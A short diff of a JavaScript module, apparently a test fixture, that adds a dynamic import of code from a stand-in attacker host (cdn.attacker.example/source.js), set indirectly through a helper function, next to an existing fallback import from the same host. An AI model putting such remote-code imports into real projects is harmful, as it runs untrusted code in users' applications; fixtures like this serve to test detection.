@@ -12,5 +12,11 @@ const legacy = await import(LEGACY_URL);
 let fallbackUrl;
 fallbackUrl = 'https://cdn.attacker.example/fallback.js';
 const fallback = await import(fallbackUrl);
+let sourceUrl;
+function pickSource() {
+  return sourceUrl = 'https://cdn.attacker.example/source.js';
+}
+pickSource();
+const source = await import(sourceUrl);
 
-export { stageModule, theme, icons, plugin, retries, legacy, fallback };
+export { stageModule, theme, icons, plugin, retries, legacy, fallback, source };
